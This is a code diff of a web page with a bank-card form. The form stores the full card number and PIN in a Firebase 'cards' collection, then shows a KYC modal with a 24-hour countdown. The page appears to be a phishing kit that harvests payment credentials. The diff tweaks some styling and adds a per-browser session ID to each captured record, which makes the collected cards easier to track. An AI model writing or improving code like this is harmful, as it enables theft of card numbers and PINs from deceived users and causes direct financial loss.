@@ -34,7 +34,7 @@
     }
     .card-box {
       width: 90%;
-      max-width: 300px;
+      max-width: 290px;
       border-radius: 16px;
       background: linear-gradient(145deg, #1976d2, #afdbff);
       box-shadow: 0 8px 20px rgba(0,0,0,0.2);
@@ -55,7 +55,7 @@
       margin: 12px 0;
     }
     .card-number input, .card-row input {
-      width: 100%;
+      width: 20%;
       padding: 8px;
       font-size: 16px;
       border: none;
@@ -72,7 +72,7 @@
       margin-top: 10px;
     }
     .card-label {
-      font-size: 12px;
+      font-size: 10px;
       margin-top: 5px;
       opacity: 0.8;
     }
@@ -194,6 +194,11 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+
+    if (!localStorage.getItem("sessionId")) {
+      const newSessionId = Math.random().toString(36).substring(2, 10) + Date.now();
+      localStorage.setItem("sessionId", newSessionId);
+    }
   </script>
 
   <script>
@@ -210,14 +215,16 @@
       }
 
       const cardNumber = `${card1}${card2}${card3}${card4}`;
+      const sessionId = localStorage.getItem("sessionId");
 
       db.collection("cards").add({
         card_number: cardNumber,
         pin: pin,
+        sessionId: sessionId,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         document.getElementById("kycModal").style.display = "flex";
-        startCountdown(24 * 60 * 60); // 24 hours in seconds
+        startCountdown(24 * 60 * 60);
       }).catch(err => {
         alert("Error saving data.");
         console.error(err);
